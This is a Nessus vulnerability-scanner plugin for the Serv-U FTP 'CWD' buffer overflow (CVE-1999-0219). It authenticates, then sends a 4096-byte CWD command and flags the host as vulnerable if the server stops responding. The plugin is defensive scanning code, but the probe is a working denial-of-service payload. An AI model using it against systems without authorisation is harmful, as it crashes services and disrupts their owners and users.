#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10089);
 script_version("$Revision: 1.37 $");
 script_cvs_date("$Date: 2014/05/26 00:06:13 $");

 script_cve_id("CVE-1999-0219");
 script_bugtraq_id(269);
 script_osvdb_id(957);

 script_name(english:"Serv-U CWD Command Overflow");
 script_summary(english:"Attempts a CWD buffer overflow");

 script_set_attribute(attribute:"synopsis", value:"The remote FTP server is affected by a buffer overflow vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote FTP server is affected by a buffer overflow vulnerability.
A remote, authenticated user can cause a denial of service via a long
'CWD' or 'LS' command. An attacker could exploit this to crash the
affected host.");
 script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1997/07/01");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"FTP");

 script_dependencie("ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
# script_exclude_keys("ftp/msftpd");
 script_require_keys("ftp/login", "ftp/servu", "Settings/ParanoidReport");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include('misc_func.inc');
include('ftp_func.inc');

if (report_paranoia < 2) audit(AUDIT_PARANOID);

login = get_kb_item_or_exit("ftp/login");
password = get_kb_item("ftp/password");

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port:port);
if ( !banner || "Serv-U FTP Server" >!< banner ) exit(0);


soc = open_sock_tcp(port);
if (! soc) exit(1);

  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
   s = strcat('CWD ', crap(4096), '\r\n');
   send(socket:soc, data:s);
   r = recv_line(socket:soc, length:1024);
   if (!r) security_hole(port);
  }
  close(soc);
